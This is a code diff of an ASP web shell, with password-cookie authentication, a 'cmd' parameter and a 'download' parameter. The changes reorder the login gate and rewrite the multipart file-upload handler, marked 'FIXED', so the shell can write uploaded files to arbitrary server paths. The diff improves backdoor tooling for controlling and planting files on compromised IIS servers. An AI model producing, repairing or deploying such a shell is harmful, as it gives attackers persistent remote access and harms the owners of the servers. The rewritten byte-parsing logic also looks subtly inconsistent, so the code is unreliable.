@@ -6,14 +6,14 @@ Dim output : output = ""
 ' ===================== AUTHENTICATION =====================
 Dim auth
 auth = Request.Cookies("auth")
+
 If auth <> PASSWORD Then
-    Response.Cookies("auth") = PASSWORD
-    Response.Write "<form method='post'><input type='password' name='auth'/><input type='submit' value='Login'/></form>"
-   
     If Request.Form("auth") = PASSWORD Then
         Response.Cookies("auth") = PASSWORD
         Response.Redirect Request.ServerVariables("SCRIPT_NAME")
     End If
+
+    Response.Write "<form method='post'><input type='password' name='auth'/><input type='submit' value='Login'/></form>"
     Response.End
 End If
 
@@ -25,35 +25,56 @@ If path = "" Then path = Server.MapPath(".")
 cmd = Request("cmd")
 download = Request("download")
 
-' ===================== UPLOAD FILE =====================
-If Request.ServerVariables("REQUEST_METHOD") = "POST" Then
+' ===================== FILE UPLOAD (FIXED) =====================
+If Request.ServerVariables("REQUEST_METHOD") = "POST" And Request.TotalBytes > 0 Then
     On Error Resume Next
-    Dim fso, stream, binData, fileName, savePath
-    
-    Set fso = Server.CreateObject("Scripting.FileSystemObject")
-    
-    fileName = Request.Form("file")
-    If fileName <> "" Then
-        fileName = fso.GetFileName(fileName)
-        savePath = path & "\" & fileName
-        
-        binData = Request.BinaryRead(Request.TotalBytes)
-        
-        Set stream = Server.CreateObject("ADODB.Stream")
-        stream.Type = 1
-        stream.Open
-        stream.Write binData
-        stream.SaveToFile savePath, 2
-        stream.Close
-        
-        If Err.Number = 0 Then
-            output = "✅ File uploaded successfully: " & fileName
-        Else
-            output = "❌ Upload Error: " & Err.Description
-        End If
+
+    Dim binData, boundary, header, filename, startPos, endPos
+    Dim streamIn, streamText, streamOut
+
+    binData = Request.BinaryRead(Request.TotalBytes)
+
+    ' Convert binary to text to extract headers
+    Set streamIn = Server.CreateObject("ADODB.Stream")
+    streamIn.Type = 1
+    streamIn.Open
+    streamIn.Write binData
+    streamIn.Position = 0
+    streamIn.Type = 2
+    streamIn.Charset = "utf-8"
+    header = streamIn.ReadText
+
+    ' Extract filename
+    Dim fStart, fEnd
+    fStart = InStr(header, "filename=""") + 10
+    fEnd = InStr(fStart, header, """")
+    filename = Mid(header, fStart, fEnd - fStart)
+    filename = Replace(filename, "\", "") ' remove full path
+
+    If filename <> "" Then
+        ' Extract boundary
+        boundary = Left(header, InStr(header, vbCrLf) - 1)
+
+        ' Find binary start/end
+        startPos = InStrB(binData, ChrB(13) & ChrB(10) & ChrB(13) & ChrB(10)) + 4
+        endPos = InStrB(startPos, binData, ChrB(13) & ChrB(10) & ChrB(45) & ChrB(45) & boundary)
+
+        ' Save file
+        Set streamOut = Server.CreateObject("ADODB.Stream")
+        streamOut.Type = 1
+        streamOut.Open
+        streamOut.Write MidB(binData, startPos, endPos - startPos)
+
+        Dim savePath
+        savePath = path & "\" & filename
+        streamOut.SaveToFile savePath, 2
+        streamOut.Close
+
+        output = "✅ File uploaded successfully: " & filename
     Else
-        output = "No file selected!"
+        output = "❌ No file selected!"
     End If
+
     On Error GoTo 0
 End If
 
